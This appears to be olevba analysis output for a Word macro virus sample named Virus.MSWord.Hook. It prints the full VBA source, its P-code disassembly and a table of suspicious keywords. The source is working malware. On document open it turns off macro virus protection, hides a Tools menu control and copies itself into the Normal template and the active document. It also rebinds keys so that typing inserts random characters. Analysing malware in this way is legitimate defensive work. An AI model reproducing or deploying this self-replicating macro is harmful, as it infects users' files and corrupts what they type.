olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Hook
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Hook - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
On Error Resume Next
Options.VirusProtection = False
Application.CommandBars("Tools").Controls(12).Visible = False

Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set TD = ThisDocument.VBProject.VBComponents(1).CodeModule
VCode = TD.Lines(1, TD.CountOfLines)
NT.DeleteLines 1, NT.CountOfLines: NT.InsertLines 1, VCode
AD.DeleteLines 1, AD.CountOfLines: AD.InsertLines 1, VCode

Randomize Selection.StoryLength
If (Int(Rnd * Selection.StoryLength)) < Selection.StoryLength Then
    For i = 1 To 25
        Application.KeyBindings.Add 2, "ThisDocument.Key_Hook", 64 + i
    Next
End If
End Sub
Private Sub Document_Close()
Application.KeyBindings.ClearAll
End Sub
Private Sub Key_Hook()
System.Cursor = wdCursorIBeam
Selection.TypeText Chr(Int(Rnd * 255))
System.Cursor = wdCursorIBeam
'// Have a nice day //
'// written by  Lord Arz [TI] //
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Hook
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2708 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	LitDI2 0x000C 
' 	LitStr 0x0005 "Tools"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #5:
' Line #6:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #7:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #8:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set TD 
' Line #9:
' 	LitDI2 0x0001 
' 	Ld TD 
' 	MemLd CountOfLines 
' 	Ld TD 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld VCode 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	ArgsMemCall DeleteLines 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld VCode 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #12:
' Line #13:
' 	Ld Selection 
' 	MemLd StoryLength 
' 	ArgsCall Read 0x0001 
' Line #14:
' 	Ld Rnd 
' 	Ld Selection 
' 	MemLd StoryLength 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	Ld Selection 
' 	MemLd StoryLength 
' 	Lt 
' 	IfBlock 
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0019 
' 	For 
' Line #16:
' 	LitDI2 0x0002 
' 	LitStr 0x0015 "ThisDocument.Key_Hook"
' 	LitDI2 0x0040 
' 	Ld i 
' 	Add 
' 	Ld Application 
' 	MemLd KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #17:
' 	StartForVariable 
' 	Next 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	EndSub 
' Line #20:
' 	FuncDefn (Private Sub Document_Close())
' Line #21:
' 	Ld Application 
' 	MemLd KeyBindings 
' 	ArgsMemCall ClearAll 0x0000 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Private Sub Key_Hook())
' Line #24:
' 	Ld wdCursorIBeam 
' 	Ld System 
' 	MemSt Cursor 
' Line #25:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #26:
' 	Ld wdCursorIBeam 
' 	Ld System 
' 	MemSt Cursor 
' Line #27:
' 	QuoteRem 0x0000 0x0015 "// Have a nice day //"
' Line #28:
' 	QuoteRem 0x0000 0x001F "// written by  Lord Arz [TI] //"
' Line #29:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

